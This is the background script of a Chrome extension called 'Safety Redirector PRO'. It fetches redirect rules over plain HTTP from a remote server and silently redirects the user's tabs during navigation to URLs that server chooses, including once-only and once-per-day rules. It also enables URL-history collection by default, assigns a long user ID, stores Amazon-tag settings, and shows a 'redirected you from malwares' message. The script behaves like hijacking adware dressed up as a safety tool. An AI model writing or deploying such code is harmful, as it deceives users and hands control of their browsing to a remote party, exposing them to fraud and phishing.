function Redirecter() {
    var self = this;
    self.initialize(); // Initialize by loading storage values

    self.fetchRules(() => {
        self.setting(() => {});
    });

    // Display redirects
    chrome.storage.local.get('report_setting', (result) => {
        let setting = result.report_setting ? JSON.parse(result.report_setting) : null;
        chrome.action.onClicked.addListener(() => {
            self.fetchRules(() => {
                self.setting(() => {
                    chrome.storage.local.get(['uTracking', 'malware'], (items) => {
                        if (setting && setting.tracking !== "0" && items.uTracking !== "0" && items.malware !== "0") {
                            toast(`Safety Redirector PRO has redirected you from ${items.malware} malwares!!`);
                        }
                    });
                });
            });
        });
    });

    chrome.webNavigation.onBeforeNavigate.addListener((tab) => {
        ruleExists(tab, tab.url);
    });

    setTimeout(refreshRules, 2 * 86400000); // Refresh rules every 2 days
}

Redirecter.prototype = {
    _rules: {},
    _referrer: {},
    _lastFetch: new Date(),

    initialize: function () {
        // Load data from chrome.storage on startup
        chrome.storage.local.get(['rules', 'referrer'], (result) => {
            this._rules = result.rules || {};
            this._referrer = result.referrer || {};
            this._lastFetch = new Date();
        });
    },

    fetchRules: function (doAfterFetch) {
        chrome.action.setIcon({ path: '/icons/loading.png' });
        const self = this;

        fetch('http://www.rules.safetyredirector.com/url_redirect3.php')
            .then((response) => {
                if (!response.ok) throw new Error('Failed to fetch rules');
                return response.json();
            })
            .then((data) => {
                self._rules = data;
                chrome.storage.local.set({ rules: self._rules });

                let ref = {};
                for (const i in self._rules) {
                    const rule = JSON.parse(self._rules[i]);
                    if (rule[2] !== undefined && rule[2] !== '') {
                        ref[i] = JSON.stringify(rule);
                    }
                }

                chrome.storage.local.set({ referrer: ref });
                self._referrer = ref;
                self._lastFetch = new Date();
                chrome.action.setIcon({ path: '/icons/refresh.png' });
                doAfterFetch();
            })
            .catch((error) => {
                console.error('Error fetching rules:', error);
                doAfterFetch(); // Proceed even if there’s an error to avoid blocking
            });
    },

    setting: function (doAfterSetting) {
        fetch('http://www.rules.safetyredirector.com/rules.php?remote=')
            .then((response) => {
                if (!response.ok) throw new Error('Failed to fetch settings');
                return response.json();
            })
            .then((data) => {
                chrome.storage.local.set({ report_setting: JSON.stringify(data) });
                doAfterSetting();
            })
            .catch((error) => {
                console.error('Error fetching settings:', error);
                doAfterSetting(); // Proceed even if there’s an error to avoid blocking
            });
    },

    _freqTracks: {},

    trackRule: function (rule) {
        this._freqTracks[rule] = new Date();
        chrome.storage.local.set({ freq_track: JSON.stringify(this._freqTracks) });
    },
};

function toast(message) {
    chrome.notifications.create({
        type: "basic",
        iconUrl: chrome.runtime.getURL("/icons/icon128.png"),
        title: "Safety Redirector PRO",
        message: message,
    }, (notificationId) => {
        if (chrome.runtime.lastError) {
            console.error("Notification Error:", chrome.runtime.lastError.message);
        } else {
            console.log("Notification shown with ID:", notificationId);
        }
    });
}

function refreshRules() {
    extension.fetchRules(() => {
        extension.setting(() => {
            setTimeout(refreshRules, 2 * 86400000);
        });
    });
}

function setUninstallUrl() {
    if (!chrome.runtime.setUninstallURL) return;
    chrome.runtime.getManifest &&
        chrome.runtime.setUninstallURL(
            "http://www.get.safetyredirector.com/uninstall/survey.php?a=" +
            chrome.runtime.getManifest().name +
            "&v=" +
            chrome.runtime.getManifest().version
        );
}

function reportEnabled(callback) {
    chrome.storage.local.get(['report_setting', 'history_enabled'], (result) => {
        let json = result.report_setting ? JSON.parse(result.report_setting) : {};
        if (json.reporting === 1) callback(true);
        else if (json.reporting === 2) callback(false);
        else callback(result.history_enabled);
    });
}

function daydiff(da, db) {
    return (da.getTime() - db.getTime()) / (1000 * 60 * 60 * 24);
}

function saveUrl(url) {
    reportEnabled((history_enabled) => {
        if (url.search('http') !== 0 || !history_enabled) return;

        chrome.storage.local.get(['history', 'report_setting'], (result) => {
            let history = result.history ? JSON.parse(result.history) : { day: new Date(), url: [] };
            let setting = result.report_setting ? JSON.parse(result.report_setting) : {};

            if (history.url.indexOf(url) === -1) history.url.push(url);

            let dif = daydiff(new Date(), new Date(history.day));
            if (dif >= setting.schedule) {
                if (history.url.length > 0) {
                    // Placeholder for server sending logic
                }
            }
            chrome.storage.local.set({ history: JSON.stringify(history) });
        });
    });
}

function ruleExists(tab, url) {
    let testURL = prepareUrl(url);

    chrome.storage.local.get(['rules', 'freq_track'], (result) => {
        let rules = result.rules || {};
        let freqTracks = result.freq_track ? JSON.parse(result.freq_track) : {};

        for (const i in rules) {
            let ruleData = JSON.parse(rules[i]);
            let from = i.substr(0, i.indexOf('_'));
            let regx = new RegExp('^' + from.replace(/\./g, '\\.').replace(/\*/g, '.*') + '$');

            if (regx.test(testURL)) {
                let checkRule = true;

                if (ruleData[3] === 'once' && freqTracks[i] !== undefined) checkRule = false;
                if (ruleData[3] === 'per24') {
                    let checkDate = new Date();
                    checkDate.setHours(checkDate.getHours() - 24);
                    if ((new Date(freqTracks[i])) > checkDate) checkRule = false;
                }

                if (checkRule) {
                    let newUrl = (/^https?:\/\//.test(ruleData[0]) ? '' : 'http://') + ruleData[0];
                    chrome.tabs.update(tab.tabId, { url: newUrl });
                }
                break;
            }
        }
    });
}

function prepareUrl(url) {
    return url
        ? url.replace(/\/$/, '').replace(/^http:\/\/|https:\/\//, '').replace(/^www\./, '')
        : '';
}

chrome.runtime.onInstalled.addListener(() => {
    chrome.storage.local.set({
        history_enabled: true,
        history: JSON.stringify({ day: new Date(), url: [] }),
        report_setting: '{"reporting":3,"schedule":1,"amazon":1,"tracking":0}',
        tag_amazon: null,
        tag_amazon_time: null,
        freq_track: '{}',
        user_id: str_gen(255),
        malware: 0,
        track_date: new Date(),
        uTracking: 0,
        showOn: false,
    });

    if (Notification.permission !== "granted") Notification.requestPermission();
});

var extension = new Redirecter();

// Utility function to generate a random string
function str_gen(len) {
    const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let text = "";
    for (let i = 0; i < len; i++) {
        text += charset.charAt(Math.floor(Math.random() * charset.length));
    }
    return text;
}
